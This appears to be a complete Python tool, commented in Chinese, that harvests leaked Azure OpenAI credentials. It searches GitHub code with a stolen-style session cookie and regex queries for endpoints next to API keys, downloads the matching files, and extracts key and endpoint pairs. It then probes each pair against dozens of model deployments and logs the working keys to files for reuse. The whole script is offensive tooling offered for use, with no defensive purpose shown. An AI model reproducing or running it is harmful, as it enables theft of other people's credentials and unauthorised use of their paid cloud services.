#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Azure OpenAI 完整扫描器 (扫描 + 深度验证一体化)
功能:
1. GitHub Session 搜索 Azure OpenAI 配置
2. 自动提取 Key 和 Endpoint
3. 实时对每个发现的配置进行深度模型可用性检测
4. 生成详细的汇总报告

整合自：
- azure_scanner.py (GitHub 扫描)
- azure_batch_validator_v2.py (深度模型检测)
"""

import os
import re
import time
import json
import threading
import random
import concurrent.futures
from queue import Queue
import requests
from datetime import datetime
from urllib.parse import urlparse
from typing import List, Dict, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# ==========================
# 配置区域
# ==========================

GITHUB_SESSION = os.getenv('GITHUB_SESSION')

# 并发配置
MAX_WORKERS = 10
VALIDATION_WORKERS = 5  # 模型验证线程数

# 目标模型列表 (来自 azure_batch_validator_v2.py)
TARGET_MODELS = [
    # GPT-3.5 系列
    "gpt-3.5-turbo",
    "gpt-3.5-turbo-0125",
    "gpt-3.5-turbo-1106",
    # GPT-4 系列
    "gpt-4",
    "gpt-4-0125-preview",
    "gpt-4-0613",
    "gpt-4-1106-preview",
    "gpt-4-turbo",
    "gpt-4-turbo-2024-04-09",
    # GPT-4.1 系列
    "gpt-4.1",
    "gpt-4.1-2025-04-14",
    "gpt-4.1-mini",
    "gpt-4.1-mini-2025-04-14",
    "gpt-4.1-nano",
    "gpt-4.1-nano-2025-04-14",
    # GPT-4o 系列
    "gpt-4o",
    "gpt-4o-2024-05-13",
    "gpt-4o-2024-08-06",
    "gpt-4o-2024-11-20",
    "gpt-4o-mini",
    "gpt-4o-mini-2024-07-18",
    # GPT-5 系列
    "gpt-5",
    "gpt-5-2025-08-07",
    "gpt-5-chat-latest",
    "gpt-5-mini",
    "gpt-5-mini-2025-08-07",
    "gpt-5-nano",
    "gpt-5-nano-2025-08-07",
    # GPT-5.1 系列
    "gpt-5.1",
    "gpt-5.1-2025-11-13",
    # 其他模型
    "grok-4-latest",
    "gpt-oss-120b",
    "gpt-oss-20b",
    # O1 系列 (推理模型)
    "o1",
    "o1-2024-12-17",
    "o1-mini",
    "o1-mini-2024-09-12",
    # O3 系列 (推理模型)
    "o3",
    "o3-2025-04-16",
    "o3-mini",
    "o3-mini-2025-01-31",
    # O4 系列 (推理模型)
    "o4-mini",
    "o4-mini-2025-04-16"
]

# 推理模型特征关键词
REASONING_MODEL_PATTERNS = [
    'o1', 'o3', 'o4',
    'gpt-5',
    'gpt-5.1',
]

# API 版本列表
API_VERSIONS = [
    "2025-01-01-preview",
    "2024-12-01-preview",
    "2024-10-01-preview",
    "2024-08-01-preview",
    "2024-06-01",
    "2024-02-01",
]

# 存储结果
processed_keys = set()
file_lock = threading.Lock()

# 文件名
results_filename = None
simple_filename = None
report_filename = None

# ==========================
# 文件初始化
# ==========================

def init_files():
    global results_filename, simple_filename, report_filename
    if results_filename is None:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_filename = f'azure_full_scan_{timestamp}.txt'
        simple_filename = f'azure_full_simple_{timestamp}.txt'
        report_filename = f'azure_full_report_{timestamp}.txt'
        
        with open(results_filename, 'w', encoding='utf-8') as f:
            f.write("=== Azure OpenAI 完整扫描结果 ===\n")
            f.write(f"开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"目标模型数： {len(TARGET_MODELS)}\n")
            f.write("=" * 60 + "\n\n")
            
        with open(simple_filename, 'w', encoding='utf-8') as f:
            f.write("=== Azure OpenAI 可用配置 ===\n")
            f.write("格式: Endpoint,Key\n")
            f.write("=" * 40 + "\n")
            
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write("=== Azure OpenAI 深度检测报告 ===\n")
            f.write(f"开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"目标模型数: {len(TARGET_MODELS)}\n")
            f.write("=" * 60 + "\n\n")

# ==========================
# 深度模型检测器 (来自 azure_batch_validator_v2.py)
# ==========================

class AzureOpenAIDeepChecker:
    """Azure OpenAI 深度模型检测器"""
    
    def __init__(self, endpoint: str, api_key: str):
        if ':' in endpoint and not endpoint.startswith('http'):
            endpoint = endpoint.split(':')[-1]
        if not endpoint.startswith('http'):
            endpoint = 'https://' + endpoint
            
        self.endpoint = endpoint.rstrip('/')
        self.api_key = api_key
        
        self.headers = {
            'api-key': self.api_key,
            'Content-Type': 'application/json'
        }
    
    def _is_reasoning_model(self, model_name: str) -> bool:
        model_lower = model_name.lower()
        for pattern in REASONING_MODEL_PATTERNS:
            if pattern in model_lower:
                return True
        return False
    
    def _build_payloads(self, model_name: str) -> List[Dict]:
        payloads = []
        is_reasoning = self._is_reasoning_model(model_name)
        
        if is_reasoning:
            payloads.append({
                "messages": [{"role": "user", "content": "Hi"}],
                "max_completion_tokens": 1
            })
            payloads.append({
                "messages": [{"role": "user", "content": "Hi"}]
            })
            payloads.append({
                "messages": [{"role": "user", "content": "Hi"}],
                "max_tokens": 1
            })
        else:
            payloads.append({
                "messages": [{"role": "user", "content": "Hi"}],
                "max_tokens": 1,
                "temperature": 0
            })
            payloads.append({
                "messages": [{"role": "user", "content": "Hi"}],
                "max_tokens": 1
            })
            payloads.append({
                "messages": [{"role": "user", "content": "Hi"}],
                "max_completion_tokens": 1
            })
            payloads.append({
                "messages": [{"role": "user", "content": "Hi"}]
            })
        
        return payloads
    
    def test_model(self, model_name: str) -> Dict[str, Any]:
        payloads = self._build_payloads(model_name)
        last_error = None
        
        for api_ver in API_VERSIONS:
            url = f"{self.endpoint}/openai/deployments/{model_name}/chat/completions?api-version={api_ver}"
            
            for payload in payloads:
                try:
                    start_time = time.time()
                    response = requests.post(url, headers=self.headers, json=payload, timeout=15)
                    response_time = time.time() - start_time
                    
                    if response.status_code == 200:
                        return {
                            "model": model_name,
                            "status": "available",
                            "response_time": response_time,
                            "api_version": api_ver
                        }
                    elif response.status_code == 404:
                        return {"model": model_name, "status": "not_deployed"}
                    elif response.status_code == 429:
                        return {
                            "model": model_name,
                            "status": "rate_limited",
                            "api_version": api_ver
                        }
                    elif response.status_code == 400:
                        last_error = f"HTTP 400"
                        continue
                    elif response.status_code == 401:
                        return {"model": model_name, "status": "invalid_key"}
                    else:
                        last_error = f"HTTP {response.status_code}"
                        
                except requests.Timeout:
                    last_error = "Timeout"
                    continue
                except Exception as e:
                    last_error = str(e)
                    continue
        
        return {"model": model_name, "status": "error", "message": last_error}
    
    def check_all_models(self) -> Dict[str, Any]:
        results = {
            "endpoint": self.endpoint,
            "available": [],
            "rate_limited": [],
            "errors": []
        }
        
        with ThreadPoolExecutor(max_workers=VALIDATION_WORKERS) as executor:
            future_to_model = {executor.submit(self.test_model, model): model for model in TARGET_MODELS}
            
            for future in as_completed(future_to_model):
                res = future.result()
                if res["status"] == "available":
                    results["available"].append(res)
                elif res["status"] == "rate_limited":
                    results["rate_limited"].append(res)
                elif res["status"] == "error":
                    results["errors"].append(res)
                    
        return results

# ==========================
# 结果保存
# ==========================

def save_result(endpoint, key, check_result, repo_name, file_url):
    """保存扫描和检测结果"""
    init_files()
    
    available_models = [m['model'] for m in check_result.get('available', [])]
    rate_limited_models = [m['model'] for m in check_result.get('rate_limited', [])]
    
    with file_lock:
        # 详细日志
        with open(results_filename, 'a', encoding='utf-8') as f:
            f.write(f"🔗 Endpoint: {endpoint}\n")
            f.write(f"🔑 Key: {key}\n")
            f.write(f"📂 Repo: {repo_name}\n")
            f.write(f"📄 File: {file_url}\n")
            if available_models:
                f.write(f"✅ Available Models ({len(available_models)}): {', '.join(available_models)}\n")
            if rate_limited_models:
                f.write(f"⚠️ Rate Limited ({len(rate_limited_models)}): {', '.join(rate_limited_models)}\n")
            f.write("-" * 60 + "\n")
            
        # 简化列表
        with open(simple_filename, 'a', encoding='utf-8') as f:
            f.write(f"{endpoint},{key}\n")
            
        # 深度报告
        with open(report_filename, 'a', encoding='utf-8') as f:
            f.write(f"🔗 Endpoint: {endpoint}\n")
            f.write(f"🔑 Key: {key}\n")
            if available_models:
                f.write("✅ Available Models:\n")
                for m in check_result['available']:
                    api_ver = m.get('api_version', 'unknown')
                    resp_time = m.get('response_time', 0)
                    f.write(f"   - {m['model']} ({resp_time:.2f}s, API: {api_ver})\n")
            if rate_limited_models:
                f.write("⚠️ Rate Limited Models:\n")
                for m in check_result['rate_limited']:
                    f.write(f"   - {m['model']}\n")
            f.write("-" * 60 + "\n")

# ==========================
# GitHub 搜索和文件处理
# ==========================

def get_headers():
    if not GITHUB_SESSION:
        raise ValueError("Missing GITHUB_SESSION")
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def search_github(query, max_pages=5):
    links = set()
    print(f"📡 搜索: {query}")
    
    for page in range(1, max_pages + 1):
        try:
            url = "https://github.com/search"
            params = {'q': query, 'type': 'code', 'p': page, 'o': 'desc', 's': 'indexed'}
            
            resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
            
            if resp.status_code == 429:
                print("   ⚠️ Rate Limited (429). Waiting 60s...")
                time.sleep(60)
                continue
            elif resp.status_code != 200:
                print(f"   ❌ Error {resp.status_code}")
                break
                
            page_links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
            
            if not page_links:
                break
                
            for link in page_links:
                full = "https://github.com" + link.split('#')[0]
                links.add(full)
                
            print(f"   Page {page}: found {len(page_links)} links")
            time.sleep(random.uniform(2, 4))
            
        except Exception as e:
            print(f"   Search Error: {e}")
            break
            
    return list(links)

def process_github_file(file_url, worker_id):
    """下载、提取、验证并深度检测"""
    try:
        # 构造 Raw URL
        if "github.com" in file_url and "/blob/" in file_url:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        resp = requests.get(raw_url, timeout=15)
        if resp.status_code != 200:
            return
            
        content = resp.text
        
        # 提取 Keys
        keys = re.findall(r'(?:key|token|secret)["\']?\s*[:=]\s*["\']([0-9a-fA-F]{32})["\']', content, re.IGNORECASE)
        raw_hexs = re.findall(r'\b[0-9a-fA-F]{32}\b', content)
        special_keys = re.findall(r'(?:^|[^A-Za-z0-9])([A-Za-z0-9]{15,}JQQJ99B[A-Za-z0-9]{1,10}XJ3w3A{3,6}[A-Za-z0-9]{0,30}COG[A-Za-z0-9]{2,6})(?:[^A-Za-z0-9]|$)', content)

        # 提取 Endpoints
        endpoints = re.findall(r'https://[a-zA-Z0-9-]+\.(?:openai|cognitiveservices|services)\.azure\.com', content)
        
        # 过滤无效 Endpoints
        ignored_domains = {
            'your-resource', 'your-endpoint', 'your-project', 'your-azure-openai', 
            'my-resource', 'example', 'placeholder', 'api-management', 'gateway',
            'your-open-ai', 'replace-with', 'your-service', 'your-name'
        }
        
        valid_endpoints = set()
        for ep in endpoints:
            domain = urlparse(ep).netloc.split('.')[0].lower()
            if domain not in ignored_domains and 'your' not in domain and 'example' not in domain:
                valid_endpoints.add(ep)

        candidates_keys = set(keys + raw_hexs + special_keys)
        
        if not candidates_keys or not valid_endpoints:
            return

        repo_match = re.search(r'githubusercontent\.com/([^/]+/[^/]+)', raw_url)
        repo_name = repo_match.group(1) if repo_match else "unknown"
        
        for ep in valid_endpoints:
            for key in candidates_keys:
                pair_id = (ep, key)
                with file_lock:
                    if pair_id in processed_keys:
                        continue
                    processed_keys.add(pair_id)
                
                print(f"[Worker-{worker_id}] 🔍 发现配置: {ep} | {key[:8]}...")
                
                # 深度模型检测
                checker = AzureOpenAIDeepChecker(ep, key)
                check_result = checker.check_all_models()
                
                # 只有发现可用或限流模型才保存
                if check_result['available'] or check_result['rate_limited']:
                    avail_count = len(check_result['available'])
                    rate_count = len(check_result['rate_limited'])
                    print(f"[Worker-{worker_id}] ✅ 有效! 可用模型: {avail_count}, 限流模型: {rate_count}")
                    
                    save_result(ep, key, check_result, repo_name, file_url)
                else:
                    print(f"[Worker-{worker_id}] ⚪ 无可用模型")
                    
                time.sleep(0.5)
                
    except Exception as e:
        pass

# ==========================
# 主函数
# ==========================

def main():
    if not GITHUB_SESSION:
        print("❌ 错误: 请在 .env 文件中设置 GITHUB_SESSION")
        return

    print("🚀 Azure OpenAI 完整扫描器 (扫描 + 深度检测)")
    print("=" * 50)
    print(f"🔥 扫描线程: {MAX_WORKERS}")
    print(f"🔥 验证线程: {VALIDATION_WORKERS}")
    print(f"🎯 目标模型数： {len(TARGET_MODELS)}")
    print("=" * 50)
    
    # 搜索查询
    models = [
        "gpt-3.5-turbo", "gpt-3.5-turbo-0125", "gpt-3.5-turbo-1106",
        "gpt-4", "gpt-4-0125-preview", "gpt-4-0613", "gpt-4-1106-preview",
        "gpt-4-turbo", "gpt-4-turbo-2024-04-09",
        "gpt-4.1", "gpt-4.1-2025-04-14", "gpt-4.1-mini", "gpt-4.1-mini-2025-04-14", "gpt-4.1-nano", "gpt-4.1-nano-2025-04-14",
        "gpt-4o", "gpt-4o-2024-05-13", "gpt-4o-2024-08-06", "gpt-4o-2024-11-20",
        "gpt-4o-mini", "gpt-4o-mini-2024-07-18",
        "gpt-5", "gpt-5-2025-08-07", "gpt-5-chat-latest", "gpt-5-mini", "gpt-5-mini-2025-08-07", "gpt-5-nano", "gpt-5-nano-2025-08-07",
        "gpt-5.1", "gpt-5.1-2025-11-13",
        "grok-4-latest", "gpt-oss-120b", "gpt-oss-20b",
        "o1", "o1-2024-12-17", "o1-mini", "o1-mini-2024-09-12",
        "o3", "o3-2025-04-16", "o3-mini", "o3-mini-2025-01-31",
        "o4-mini", "o4-mini-2025-04-16"
    ]

    key_regex = r'/(^|[^A-Za-z0-9])[A-Za-z0-9]{15,}JQQJ99B[A-Za-z0-9]{1,10}XJ3w3A{3,6}[A-Za-z0-9]{0,30}COG[A-Za-z0-9]{2,6}([^A-Za-z0-9]|$)/'
    hex_key_regex = r'/\b[0-9a-f]{32}\b/'
    
    base_queries = [
        # 完整 URL 正则 + 特殊 Key 正则
        r'/https:\/\/[a-z0-9-]+\.openai\.azure\.com/ ' + key_regex,
        r'/https:\/\/[a-z0-9-]+\.cognitiveservices\.azure\.com/ ' + key_regex,
        r'/https:\/\/[a-z0-9-]+\.services\.azure\.com/ ' + key_regex,
        # 完整 URL 正则 + Hex Key 正则
        r'/https:\/\/[a-z0-9-]+\.openai\.azure\.com/ ' + hex_key_regex,
        r'/https:\/\/[a-z0-9-]+\.cognitiveservices\.azure\.com/ ' + hex_key_regex,
        r'/https:\/\/[a-z0-9-]+\.services\.azure\.com/ ' + hex_key_regex,
        # 简化域名 + 特殊 Key 正则
        r'openai.azure.com ' + key_regex,
        r'cognitiveservices.azure.com ' + key_regex,
        r'services.azure.com ' + key_regex,
        # 简化域名 + Hex Key 正则
        r'openai.azure.com ' + hex_key_regex,
        r'cognitiveservices.azure.com ' + hex_key_regex,
    ]

    queries = list(base_queries)
    
    for model in models:
        queries.append(f'{base_queries[0]} {model}')
        queries.append(f'{base_queries[1]} {model}')
        queries.append(f'{base_queries[2]} {model}')
    
    all_files = set()
    for q in queries:
        files = search_github(q, max_pages=5)
        all_files.update(files)
        
    print(f"\n🗂️ 共发现 {len(all_files)} 个待处理文件")
    print("🔄 开始扫描和深度检测...\n")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_github_file, url, i%MAX_WORKERS) for i, url in enumerate(all_files)]
        for _ in concurrent.futures.as_completed(futures):
            pass
            
    print("\n" + "=" * 60)
    print("🏁 扫描完成!")
    if results_filename:
        print(f"📄 详细结果: {results_filename}")
        print(f"📋 简化列表: {simple_filename}")
        print(f"📊 深度报告: {report_filename}")

if __name__ == "__main__":
    main()